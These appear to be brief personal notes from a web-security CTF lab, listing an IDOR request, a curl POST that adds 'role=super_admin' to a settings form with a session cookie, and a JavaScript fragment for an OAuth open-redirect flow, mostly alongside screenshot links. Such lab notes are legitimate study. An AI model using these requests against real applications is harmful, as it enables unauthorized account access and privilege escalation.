___

# IDOR

```
GET https://0hl3b40h.eu1.ctfio.com/api/v1/user/2
```

![[Pasted image 20241217171151.png]]

![[Pasted image 20241217171523.png]]

# Invite Systems

![[Pasted image 20241217172150.png]]

![[Pasted image 20241217172208.png]]

## 1

![[Pasted image 20241217172546.png]]

![[Pasted image 20241217172642.png]]

# Mass Assigment

Response,
```json
const user = {"id":1,"username":"ben","role":"user"};
```

```bash
curl 'https://69xknhzf.eu1.ctfio.com/settings' --compressed -X POST -H 'Cookie: token=9435b4e9dd38cf2a8458fb3  
167186173' --data-raw 'website=http%3A%2F%2Fwww.google.com&phone=123456789&bio=Test&role=super_admin'
```

![[Pasted image 20241217175156.png]]

# OAuth Flow using Open Redirect

```js
document.location.hash.substr(1)
```